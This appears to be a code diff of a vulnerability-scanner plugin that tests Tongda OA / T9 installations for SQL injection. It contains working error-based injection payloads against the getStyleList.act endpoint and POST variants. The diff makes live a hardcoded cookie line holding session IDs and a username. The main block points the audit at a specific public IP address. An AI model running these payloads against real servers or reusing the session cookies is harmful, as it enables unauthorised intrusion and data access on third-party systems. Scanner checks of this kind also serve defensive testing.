@@ -14,7 +14,7 @@ def assign(service, arg):
 
 def audit(arg):
     #debug
-    #cookie = 'JSESSIONID=7EA8E07AA72303D26783FF26F9B0A726; PHPSESSID=87a20a12486590a5c5f8346d8d1a6b90; JSESSIONID=ABCED0BCF3F33C579EABC281FC19FEB6; userName=800051; SID_1217=3771a442eb13dae311e8dfbcb0d4bae6'
+    cookie = 'JSESSIONID=7EA8E07AA72303D26783FF26F9B0A726; PHPSESSID=87a20a12486590a5c5f8346d8d1a6b90; JSESSIONID=ABCED0BCF3F33C579EABC281FC19FEB6; userName=800051; SID_1217=3771a442eb13dae311e8dfbcb0d4bae6'
     #proxy = ('127.0.0.1', 8887)
     payloads1 = [
         't9/t9/project/system/act/T9ProjSystemAct/getStyleList.act?classNo=PROJ_TYPE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
@@ -56,7 +56,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(arg + payloads2[i], post=posts[i], cookie=cookie)
         if code == 200 and md5_1 in res:
             security_hole(payload+' POST: '+posts[i]+' sql注入');
-    
+
 if __name__ == '__main__':
     from dummy import *
     audit(assign('tongdaoa', 'http://222.184.237.181/')[1])
